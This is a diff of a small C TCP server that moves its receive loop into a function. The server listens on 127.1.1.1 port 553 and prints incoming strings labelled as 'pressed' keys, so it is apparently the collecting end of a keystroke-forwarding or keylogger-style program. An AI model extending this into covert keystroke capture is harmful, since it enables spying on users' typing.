@@ -7,26 +7,35 @@
 #define ip "127.1.1.1"
 #define port 553
 
+// variables the socket he is sending and receiving
+//  sending and receiving the key we pressed
+void send_recv(int);
+// returns the socket we are sending the key to
+// initializes the socket
 int init_socket();
 int main()
 {
     int client_sock;
-    char buffer[20];
 
     client_sock = init_socket();
-    while (1)
-    {
-
-        recv(client_sock, buffer, sizeof(buffer), 0);
-        printf("Client: %s\n", buffer);
-
-        send(client_sock, "ok", 2, 0);
-    }
+    send_recv(client_sock);
     close(client_sock);
 
     return 0;
 }
+void send_recv(int client_sock)
+{
+    char buffer[20];
 
+    while (1)
+    {
+
+        recv(client_sock, buffer, sizeof(buffer), 0);
+        printf(" pressed %s\n", buffer);
+
+        send(client_sock, "ok", 2, 0);
+    }
+}
 int init_socket()
 {
     int server_sock, client_sock;
